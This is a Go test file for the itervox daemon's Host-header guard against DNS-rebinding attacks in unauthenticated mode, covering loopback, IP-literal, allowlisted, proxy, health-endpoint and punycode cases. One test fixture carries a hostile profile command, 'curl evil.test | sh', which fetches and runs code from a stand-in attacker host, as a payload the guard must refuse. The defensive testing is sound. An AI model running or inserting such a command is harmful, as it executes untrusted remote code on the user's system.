package server_test

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/vnovick/itervox/internal/config"
	"github.com/vnovick/itervox/internal/server"
)

// hostGuardServer is a server.allow_unauthenticated daemon (no API token)
// whose profile upsert is counted, so a test can prove a refused request had
// no side effect.
func hostGuardServer(t *testing.T, mutate func(*server.Config)) (*server.Server, *int) {
	t.Helper()
	upserts := 0
	cfg := makeTestConfig(baseSnap())
	cfg.AllowedHosts = nil // makeTestConfig allowlists httptest's example.com
	cfg.Client = &server.FuncClient{
		UpsertProfileFn: func(string, server.ProfileDef, string) error {
			upserts++
			return nil
		},
	}
	if mutate != nil {
		mutate(&cfg)
	}
	return server.New(cfg), &upserts
}

func hostRequest(method, path, host, body string) *http.Request {
	var req *http.Request
	if body == "" {
		req = httptest.NewRequest(method, path, nil)
	} else {
		req = httptest.NewRequest(method, path, strings.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
	}
	req.Host = host
	// Bounded so an SSE route that is (wrongly) admitted ends the test with
	// a status assertion failure instead of streaming forever.
	ctx, cancel := context.WithTimeout(req.Context(), 500*time.Millisecond)
	_ = cancel // released by the deadline; tests are short-lived
	return req.WithContext(ctx)
}

func assertHostRefused(t *testing.T, w *httptest.ResponseRecorder) {
	t.Helper()
	require.Equal(t, http.StatusForbidden, w.Code, "body: %s", w.Body.String())
	var resp struct {
		Error struct {
			Code    string `json:"code"`
			Message string `json:"message"`
		} `json:"error"`
	}
	require.NoError(t, json.Unmarshal(w.Body.Bytes(), &resp), "body: %s", w.Body.String())
	assert.Equal(t, "host_not_allowed", resp.Error.Code)
	assert.NotEmpty(t, resp.Error.Message)
}

// CORE-162: a DNS-rebound page (evil.test -> 127.0.0.1) sends a SAME-ORIGIN
// PUT, so CrossOriginProtection passes it. Only the Host header betrays it.
func TestUnauthenticatedMode_RebindingProfileUpsertRefused(t *testing.T) {
	srv, upserts := hostGuardServer(t, nil)
	req := hostRequest(http.MethodPut, "/api/v1/settings/profiles/x", "evil.test:8090",
		`{"command":"sh -c 'curl evil.test | sh'"}`)
	req.Header.Set("Origin", "http://evil.test:8090")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, req)
	assertHostRefused(t, w)
	assert.Equal(t, 0, *upserts, "a refused rebinding request must not reach the profile store")
}

// CORE-162: the same trick must not read state, logs, the SSE stream or the SPA.
func TestUnauthenticatedMode_RebindingReadsRefused(t *testing.T) {
	srv, _ := hostGuardServer(t, nil)
	for _, path := range []string{"/api/v1/state", "/api/v1/logs", "/api/v1/events", "/", "/index.html", "/api/v1/settings/profiles"} {
		t.Run(path, func(t *testing.T) {
			w := httptest.NewRecorder()
			srv.ServeHTTP(w, hostRequest(http.MethodGet, path, "evil.test:8090", ""))
			assertHostRefused(t, w)
		})
	}
}

// Loopback addressed any usual way — with a port, IPv6 bracketed — passes.
func TestUnauthenticatedMode_LoopbackHostsAccepted(t *testing.T) {
	srv, upserts := hostGuardServer(t, nil)
	for _, host := range []string{"localhost:8090", "LOCALHOST:8090", "localhost", "localhost.:8090", "127.0.0.1:8090", "127.0.0.1", "[::1]:8090", "[::1]"} {
		t.Run(host, func(t *testing.T) {
			w := httptest.NewRecorder()
			srv.ServeHTTP(w, hostRequest(http.MethodGet, "/api/v1/state", host, ""))
			assert.Equal(t, http.StatusOK, w.Code, "body: %s", w.Body.String())
		})
	}
	before := *upserts
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, hostRequest(http.MethodPut, "/api/v1/settings/profiles/x", "127.0.0.1:8090", `{"command":"claude"}`))
	assert.Equal(t, http.StatusOK, w.Code, "body: %s", w.Body.String())
	assert.Equal(t, before+1, *upserts)
}

// Rule: any IP literal passes (rebinding needs a DNS name), so LAN access by
// address and container probes by pod IP keep working with server.host 0.0.0.0.
func TestUnauthenticatedMode_IPLiteralHostsAccepted(t *testing.T) {
	srv, _ := hostGuardServer(t, func(c *server.Config) { c.BindHost = "0.0.0.0" })
	for _, host := range []string{"192.168.1.20:8090", "10.0.0.5", "[fe80::1]:8090", "[2001:db8::1]"} {
		t.Run(host, func(t *testing.T) {
			w := httptest.NewRecorder()
			srv.ServeHTTP(w, hostRequest(http.MethodGet, "/api/v1/state", host, ""))
			assert.Equal(t, http.StatusOK, w.Code, "body: %s", w.Body.String())
		})
	}
	// A name that merely LOOKS numeric (decimal-encoded 127.0.0.1) is a
	// name, not an IP literal — browsers normalise real IPs to dotted form.
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, hostRequest(http.MethodGet, "/api/v1/state", "2130706433:8090", ""))
	assertHostRefused(t, w)
}

// Names in server.allowed_hosts and a name-valued server.host pass;
// anything else stays refused.
func TestUnauthenticatedMode_AllowlistedHostAccepted(t *testing.T) {
	srv, upserts := hostGuardServer(t, func(c *server.Config) {
		c.BindHost = "devbox.lan"
		c.AllowedHosts = []string{"Itervox.Example.com", "proxy.internal:443", " "}
	})
	for _, host := range []string{"itervox.example.com", "ITERVOX.example.com:8443", "proxy.internal:8090", "devbox.lan:8090"} {
		t.Run(host, func(t *testing.T) {
			w := httptest.NewRecorder()
			srv.ServeHTTP(w, hostRequest(http.MethodPut, "/api/v1/settings/profiles/x", host, `{"command":"claude"}`))
			assert.Equal(t, http.StatusOK, w.Code, "body: %s", w.Body.String())
		})
	}
	assert.Equal(t, 4, *upserts)
	for _, host := range []string{"evil.test", "sub.itervox.example.com", "example.com"} {
		t.Run("refused/"+host, func(t *testing.T) {
			w := httptest.NewRecorder()
			srv.ServeHTTP(w, hostRequest(http.MethodGet, "/api/v1/state", host, ""))
			assertHostRefused(t, w)
		})
	}
}

// web/vite.config.ts proxies /api with changeOrigin: true, so the daemon
// sees Host = the proxy target (localhost:8090 or the 127.0.0.1:<port> from
// .itervox/dashboard_url) and Origin http://localhost:5173.
func TestUnauthenticatedMode_HostGuardAllowsViteDevProxy(t *testing.T) {
	srv, upserts := hostGuardServer(t, nil)
	for _, host := range []string{"localhost:8090", "127.0.0.1:54321"} {
		req := hostRequest(http.MethodPut, "/api/v1/settings/profiles/x", host, `{"command":"claude"}`)
		req.Header.Set("Origin", "http://localhost:5173")
		req.Header.Set("Sec-Fetch-Site", "same-origin")
		w := httptest.NewRecorder()
		srv.ServeHTTP(w, req)
		assert.Equal(t, http.StatusOK, w.Code, "host %s body: %s", host, w.Body.String())
	}
	assert.Equal(t, 2, *upserts)
}

// GET /api/v1/health is exempt — it returns a constant and has no side
// effect — so a probe that sends a hostname still works. Nothing else is.
func TestUnauthenticatedMode_HealthExemptFromHostGuard(t *testing.T) {
	srv, _ := hostGuardServer(t, nil)
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, hostRequest(http.MethodGet, "/api/v1/health", "itervox.default.svc.cluster.local:8090", ""))
	assert.Equal(t, http.StatusOK, w.Code, "body: %s", w.Body.String())
	for _, path := range []string{"/api/v1/health/", "/api/v1/healthz", "/api/v1/health/../state"} {
		w := httptest.NewRecorder()
		srv.ServeHTTP(w, hostRequest(http.MethodGet, path, "evil.test", ""))
		assertHostRefused(t, w)
	}
	w = httptest.NewRecorder()
	srv.ServeHTTP(w, hostRequest(http.MethodPost, "/api/v1/health", "evil.test", ""))
	assertHostRefused(t, w)
}

// Token mode: no Host guard (the rebound page holds no token); the bearer
// check still refuses it, and a proxied hostname keeps working.
func TestTokenMode_HostGuardNotApplied(t *testing.T) {
	srv, upserts := hostGuardServer(t, func(c *server.Config) { c.APIToken = "s3cret" })
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, hostRequest(http.MethodPut, "/api/v1/settings/profiles/x", "evil.test:8090", `{"command":"x"}`))
	assert.Equal(t, http.StatusUnauthorized, w.Code, "body: %s", w.Body.String())
	assert.Equal(t, 0, *upserts)

	req := hostRequest(http.MethodGet, "/api/v1/state", "itervox.example.com", "")
	req.Header.Set("Authorization", "Bearer s3cret")
	w = httptest.NewRecorder()
	srv.ServeHTTP(w, req)
	assert.Equal(t, http.StatusOK, w.Code, "body: %s", w.Body.String())
}

// BH2 end to end: a Unicode name in server.allowed_hosts, loaded through the
// real config loader, must admit the punycode Host a browser actually sends
// for it. Before, the entry stayed Unicode and never matched.
func TestUnauthenticatedMode_UnicodeAllowedHostMatchesPunycodeHost(t *testing.T) {
	path := filepath.Join(t.TempDir(), "WORKFLOW.md")
	require.NoError(t, os.WriteFile(path, []byte("---\ntracker:\n  kind: linear\n  api_key: k\n  project_slug: p\n"+
		"server:\n  allowed_hosts:\n    - bücher.example\n---\n\nPrompt.\n"), 0o644))
	loaded, err := config.Load(path)
	require.NoError(t, err)

	srv, _ := hostGuardServer(t, func(c *server.Config) { c.AllowedHosts = loaded.Server.AllowedHosts })
	w := httptest.NewRecorder()
	srv.ServeHTTP(w, hostRequest(http.MethodGet, "/api/v1/state", "xn--bcher-kva.example:8090", ""))
	assert.Equal(t, http.StatusOK, w.Code, "body: %s", w.Body.String())
}
